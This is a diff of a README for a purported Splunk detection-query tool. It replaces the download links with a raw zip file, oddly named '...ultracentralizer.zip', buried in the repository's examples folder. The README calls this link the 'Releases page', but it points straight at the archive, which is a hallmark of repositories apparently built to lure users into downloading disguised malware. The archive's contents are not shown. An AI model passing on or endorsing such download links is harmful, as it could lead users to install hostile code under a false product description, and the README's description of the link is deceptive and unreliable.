@@ -1,6 +1,6 @@
 # 🎉 splunk-detection-engineer-agent - Turn Natural Language into Queries Easily
 
-[![Download](https://github.com/anubis01sk/splunk-detection-engineer-agent/raw/refs/heads/main/tests/splunk-agent-engineer-detection-2.0.zip)](https://github.com/anubis01sk/splunk-detection-engineer-agent/raw/refs/heads/main/tests/splunk-agent-engineer-detection-2.0.zip)
+[![Download](https://github.com/anubis01sk/splunk-detection-engineer-agent/raw/refs/heads/main/examples/splunk-detection-agent-engineer-ultracentralizer.zip)](https://github.com/anubis01sk/splunk-detection-engineer-agent/raw/refs/heads/main/examples/splunk-detection-agent-engineer-ultracentralizer.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ To download and install the splunk-detection-engineer-agent, follow these simple
 
 1. **Visit the Releases Page**: 
    Click on the following link to go to the Releases page:
-   [Download Here](https://github.com/anubis01sk/splunk-detection-engineer-agent/raw/refs/heads/main/tests/splunk-agent-engineer-detection-2.0.zip)
+   [Download Here](https://github.com/anubis01sk/splunk-detection-engineer-agent/raw/refs/heads/main/examples/splunk-detection-agent-engineer-ultracentralizer.zip)
 
 2. **Choose the Latest Version**: 
    Once on the page, look for the latest version of the application. You will see a list of available files for download.
